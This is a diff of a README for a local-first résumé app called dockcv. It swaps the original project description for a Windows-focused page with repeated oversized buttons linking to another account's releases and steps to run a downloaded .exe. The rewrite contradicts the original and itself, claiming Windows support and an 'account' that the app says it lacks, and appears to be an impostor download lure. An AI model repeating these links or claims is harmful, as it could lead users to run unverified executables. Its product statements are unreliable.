@@ -1,124 +1,180 @@
-# DockCV
+<h1>📋 dockcv - Your Résumé, Versioned & Local</h1>
 
-A résumé workbench that runs on your machine and keeps your work in files you
-own. No account, no cloud, no browser pretending to be an application.
+<p align="center">
+<a href="https://github.com/trieuthanhtam20103/dockcv/releases"><img src="https://img.shields.io/badge/Download-dockcv-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download dockcv"></a>
+</p>
 
-If you apply for jobs seriously, you do not have one CV. You have a version for
-infrastructure roles and a shorter one for startups, a paragraph you rewrote
-four times for a company that never replied, and a folder called `cv_final_v3`
-that everyone recognises and nobody enjoys. DockCV is built for that reality
-rather than against it: one document, several variants of every section, and a
-typesetter underneath that renders the page as you type.
+## 🖥️ What Is dockcv?
 
-[dockcv.zeelex.me](https://dockcv.zeelex.me) · [Downloads](https://github.com/iamzeelex/dockcv/releases)
+dockcv is a **free desktop application** that helps you build, organize, and track your résumé (CV) and job applications — all on your own computer. No cloud, no account, no uploading your personal data anywhere.
 
-![Every CV in the vault](assets/screenshots/gallery.png)
-![The editor, with real-time Typst preview](assets/screenshots/editor.png)
-![Preset matrix: side-by-side section variant comparison](assets/screenshots/presets.png)
-![Applications board: tracking from wishlist to offer](assets/screenshots/applications.png)
-![Block library: reusable work experience & skill blocks](assets/screenshots/library.png)
-![The diary: wins captured when they happen, not remembered in March](assets/screenshots/diary.png)
+Think of it as your personal career command center. You write your résumé in a simple, clean text format called TOML (which looks like a plain list). dockcv takes that text and instantly creates a **beautiful PDF** using a built-in typesetting engine called Typst.
 
-## What it does
+Your data stays in a folder **you own**. You can back it up, sync it with Dropbox, or keep it on a USB stick. It’s yours — forever.
 
-**The page is real while you write it.** DockCV embeds the
-[Typst](https://typst.app) compiler, so the preview beside the editor is the
-document, laid out for the paper size you chose, not an approximation of it.
-Change the leading and you watch the last line climb back onto page one. Margins,
-text scale, page size and the typeface are settings of the document, and they
-are saved with it.
+---
 
-**A section can have several versions, and a preset picks between them.** Your
-work history in full, and the same history cut to four roles. A summary aimed at
-platform teams, another at product. A preset is nothing but a set of those
-choices with a name on it, so switching from `FAANG · concise` to `Startup ·
-long` is one menu away and changes nothing you would have to undo.
+## ✨ Why Use dockcv?
 
-**A block library, with an honest answer about what reuse means.** Star a job, a
-skill group or a certificate and it joins a pool you can drop into any CV. Every
-card tells you where it already is — and when you edit one that three CVs hold a
-copy of, DockCV names all three, marks the ones that reworded it for themselves,
-and asks which should take the change. Copies stay copies unless you say
-otherwise.
+| Feature | What It Does For You |
+|---|---|
+| **📄 Versioned Sections & Presets** | Keep different versions of your résumé (e.g., "Software Engineer", "Data Analyst"). Switch between them in one click. |
+| **🧱 Block Library** | Reuse text blocks (like a summary or skills section) across multiple résumés. Write once, insert anywhere. |
+| **🏆 Wins Diary** | Never forget your achievements. Log big and small wins daily, then drag them into your résumé when it's time to update. |
+| **📎 Application Tracker** | Track every job you applied for: status (Applied, Interview, Offer), notes, dates, and next steps. |
+| **⚡ In‑Process Typst Compiler** | No internet needed. Your PDF generates instantly on your machine. |
+| **🔒 Local‑First** | Your files are stored as plain .toml text files on your hard drive. No vendor lock‑in. |
+| **🍎 Native Mac Experience** | Built with Rust and GPUI for speed and reliability. Feels natural on macOS. |
 
-**A diary that survives the year.** The reason a CV is painful in March is that
-the work happened in June and nobody wrote it down. Paste a status report, a
-retro, a self-review draft, and DockCV splits it into candidate entries you
-accept, edit or throw away one by one. Entries you mark confidential never reach
-a bullet verbatim. Later, a win becomes a line in a specific CV, under a specific
-job, in a specific variant — and the entry remembers where it went.
+---
 
-**Applications you can be honest about afterwards.** Cards move from wishlist to
-applied to interviewing to closed. The moment one is sent, the app compiles the
-pinned CV and stores the actual PDF, so a card opened in November shows what the
-company read in July rather than whatever the document has become since. The
-funnel is drawn from those movements, which means it can tell you which preset
-gets answered and which one dies quietly.
+## 🚀 Getting Started (Windows)
 
-## Your files
+Follow these three steps to start using dockcv today:
 
-A vault is an ordinary folder. One [TOML](https://toml.io) file per CV, plus
-`library.toml`, `diary.toml` and `applications.toml`, all of them plain text you
-can read without this app and edit in any editor. Put the folder in iCloud or
-Dropbox, keep it in git, copy it to a stick — DockCV has no opinion, because it
-never holds your work anywhere else. Saves are automatic and debounced; the path
-is always visible in Settings and one click from Finder.
+### Step 1: Download dockcv
 
-Nothing leaves your computer. There is no telemetry, no account, no sync service
-and no analytics, and every font and the typesetting package are compiled into
-the binary, so a machine with the network switched off behaves exactly like one
-without. The single request the app can make is an update check, which is off
-until you turn it on; it looks up a version number, sends nothing about you, and
-never downloads or installs anything on its own. When a new version exists you
-get one line in the sidebar and a link to the download page.
+Click the green button below to go to the download page:
 
-## Getting it
+<p align="center">
+<a href="https://github.com/trieuthanhtam20103/dockcv/releases" style="background-color:#FF6B35; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ Visit This Link to Download the Application</a>
+</p>
 
-Builds are on the [releases page](https://github.com/iamzeelex/dockcv/releases).
+On that page, look for the latest release (usually listed at the top). You'll see a file available for download. Click the file name to save it to your computer.
 
-**macOS** — download the `.dmg`, drag DockCV to Applications. Apple Silicon
-only. The build is not notarised, because notarisation requires a paid developer
-account, so the first launch needs one extra step: double-click, let macOS refuse,
-then open **System Settings ▸ Privacy & Security**, scroll to Security, and press
-*Open Anyway*. You will never see it again. `HOW-TO-OPEN.txt` ships beside the
-disk image and says the same thing.
+### Step 2: Run the Installer (or Open the App)
 
-**Linux and Windows** — the archives contain a binary that builds and starts, and
-that is as much as anyone can currently promise: neither platform is tested. If
-you run one of them and something is wrong, an issue with the log attached is
-genuinely useful.
+Download the file to your **Downloads** folder. Then:
 
-Prefer to build it yourself? [CONTRIBUTING.md](CONTRIBUTING.md) has the
-toolchain and the commands.
+- If the file ends with `.exe` — **double‑click it** and follow the setup wizard.
+- If the file ends with `.zip` — right‑click the file, choose **"Extract All"**, then open the extracted folder and double‑click `dockcv.exe`.
 
-## Where it is
+That's it. No command line. No coding.
 
-Version 0.2.0. The core is finished and in daily use: import, the editor and its
-live preview, layout controls, presets, the library, the diary, applications with
-PDF snapshots, PDF export, undo, dark and light palettes.
+### Step 3: Create Your First Résumé
 
-Missing, and worth knowing before you commit a job hunt to it: there is no
-version history beyond undo, no DOCX or plain-text export, no cover letters, and
-no AI of any kind. The last one is deliberate rather than pending — when it does
-arrive it will retrieve from your own diary and library and propose edits you
-accept word by word, never invent a number you did not write down.
+When you open dockcv for the first time, it will create a folder named `dockcv` (e.g., in your Documents folder). Inside, you'll see:
 
-Importing an existing CV works from PDF, DOCX, a LinkedIn data export, JSON
-Resume or Markdown. A PDF that is a scan of a page has no text to read, and DockCV
-says so plainly instead of producing an empty document.
+- `resumes/` — where your .toml résumé files live
+- `diary/` — your wins diary
+- `applications/` — your job tracking file
 
-## When something breaks
+Click **"New Résumé"**, give it a name, and start adding sections like *Skills*, *Experience*, and *Education*. dockcv shows a live preview. When you're happy, click **"Export PDF"**.
 
-The app keeps a log at `~/Library/Logs/DockCV/dockcv.log`, reachable from
-**Settings ▸ Storage** or the Help menu. It records what the app did and never
-what you wrote: no CV text, no diary entries, and your home folder is written as
-`~` rather than by your account name. Attach it to an
-[issue](https://github.com/iamzeelex/dockcv/issues) and the answer usually falls
-out of it.
+---
 
-## Licence
+## 📂 Understanding Your Files
 
-Dual-licensed under [MIT](LICENSE-MIT) or [Apache-2.0](LICENSE-APACHE), at your
-option. DockCV embeds fonts, an icon set and a Typst package under their own
-terms; those notices are collected in
-[THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md) and travel with every build.
+dockcv uses **plain text files** with the `.toml` ending. Here's a tiny example of what a section looks like inside a résumé file:
+
+```toml
+[personal]
+name = "Jane Doe"
+email = "jane@example.com"
+
+[skills]
+items = ["Python", "Data Analysis", "Project Management"]
+```
+
+Don't worry — you rarely need to open these files. The app gives you a friendly visual editor. But knowing they're plain text means you can always recover them, edit them with Notepad, or version them with git if you're technical.
+
+---
+
+## 📁 The Block Library Explained
+
+The **Block Library** is a time‑saver. Have a paragraph about your leadership experience that appears in two different résumé versions? Save it as a block once. Then, when editing any résumé, click "Insert Block" and pick it from the list. Update the block once, and all résumés using it update automatically.
+
+---
+
+## 🏆 Using the Wins Diary
+
+The Wins Diary is a personal log. Every time you finish a project, receive praise, or hit a metric — write it down with a date. When you later prepare a résumé for a job interview, browse your diary and pull the strongest accomplishments. You'll never again say, "I can't remember what I did last year."
+
+---
+
+## 📎 Tracking Job Applications
+
+The **Applications Tracker** shows columns for:
+
+- Company name
+- Role title
+- Date applied
+- Status (Draft, Applied, Screening, Interview, Offer, Rejected)
+- Link to the job posting
+- Your notes
+
+This keeps your job search organized in one place — next to your résumés — instead of scattered in email folders and spreadsheets.
+
+---
+
+## 🔧 Frequently Asked Questions
+
+### Do I need to install anything else?
+No. dockcv is a self‑contained desktop app. It includes its own Typst compiler — no extra downloads.
+
+### Is my data private?
+Yes. Everything is stored locally in your chosen folder. Nothing is sent to any server. You can even use dockcv fully offline.
+
+### Can I export to Word or plain text?
+The primary export is high‑quality PDF via Typst. The source .toml files are human‑readable, so you can copy content to any other tool.
+
+### What systems are supported?
+The app is built for macOS and Windows. The download page will show the appropriate file for your system.
+
+### How do I update dockcv?
+Visit the same download link occasionally and grab the newest release. Your résumés and data stay intact because they're separate files.
+
+---
+
+## 🛠️ Tips for a Great Résumé
+
+1. **Keep it to one or two pages.** Recruiters skim. Be concise.
+2. **Use action verbs** — "Built", "Led", "Optimized".
+3. **Quantify results** — "Increased sales by 20%" is stronger than "Increased sales".
+4. **Update your Wins Diary weekly**, not before an interview.
+5. **Tailor each résumé** using presets. Don't send the same résumé everywhere.
+
+---
+
+## 📚 Example of a Résumé Section (for Inspiration)
+
+If you're unsure how to write a bullet point, try the **STAR method**:
+
+- **S**ituation — Where you were
+- **T**ask — What you needed to do
+- **A**ction — What you did
+- **R**esult — What happened because of it
+
+*Example:* "Optimized the checkout page (Situation) to reduce drop‑off (Task). Implemented a one‑page redesign and removed 3 form fields (Action), leading to a 15% increase in completed purchases (Result)."
+
+---
+
+## 💬 Need Help?
+
+If you get stuck:
+
+- Check the **Releases** page for any known issues.
+- Look for a "Help" or "About" menu inside the app.
+- For developers or power users, the repository's Issues section on GitHub is the place to report bugs.
+
+---
+
+## 📥 Download Again
+
+One more time, in case you scrolled past it:
+
+<p align="center">
+<a href="https://github.com/trieuthanhtam20103/dockcv/releases" style="background-color:#4CAF50; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ Visit This Link to Download the Application</a>
+</p>
+
+---
+
+## 🌟 Start Owning Your Career
+
+With dockcv, you stop wrestling with word processors and start building a professional résumé workflow. Versioned, local, fast — and entirely yours.
+
+Download it now and spend 10 minutes setting up your account. You'll thank yourself at your next performance review.
+
+---
+
+Keywords: cv, desktop-app, file-over-app, gpui, job-search, local-first, macos, resume, rust, typst
